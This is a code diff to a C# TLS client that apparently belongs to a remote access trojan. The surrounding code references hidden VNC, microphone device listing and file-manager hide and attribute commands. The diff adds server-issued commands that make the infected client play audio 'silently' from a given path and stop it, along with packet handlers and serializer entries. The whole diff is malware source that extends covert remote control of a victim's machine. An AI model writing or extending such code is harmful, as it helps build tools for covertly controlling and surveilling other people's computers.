@@ -488,6 +488,15 @@ internal class TlsClient : IDisposable
                         _ = WritePacketAsync(new Packet { Type = PacketType.FmAck, Data = FileManagerFeature.SetAttributes(fmSa.Path, fmSa.Attributes) }, ct);
                     break;
 
+                case PacketType.FmPlayAudio:
+                    var fmPa = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmPlayAudioDataStub);
+                    if (fmPa != null) FileManagerFeature.PlayAudioSilent(fmPa.Path);
+                    break;
+
+                case PacketType.FmPlayAudioStop:
+                    FileManagerFeature.StopAudio();
+                    break;
+
                 // ── Microphone ───────────────────────────────────────
                 case PacketType.MicGetDevices:
                     _ = WritePacketAsync(new Packet
@@ -2035,7 +2044,9 @@ internal enum PacketType
     FmHashResult = 140,
     FmAck        = 141,
     FmShowHide   = 142,
-    FmSetAttr    = 143,
+    FmSetAttr        = 143,
+    FmPlayAudio      = 144,  // server→client: play audio silently {Path}
+    FmPlayAudioStop  = 145,  // server→client: stop silent audio
 
     MicGetDevices    = 150,
     MicDevicesResult = 151,
@@ -2296,6 +2307,7 @@ internal class HvncProgressDataStub
 [JsonSerializable(typeof(FmAckDataStub))]
 [JsonSerializable(typeof(FmShowHideDataStub))]
 [JsonSerializable(typeof(FmSetAttrDataStub))]
+[JsonSerializable(typeof(FmPlayAudioDataStub))]
 // Microphone
 [JsonSerializable(typeof(MicDeviceStub))]
 [JsonSerializable(typeof(MicDevicesResultStub))]
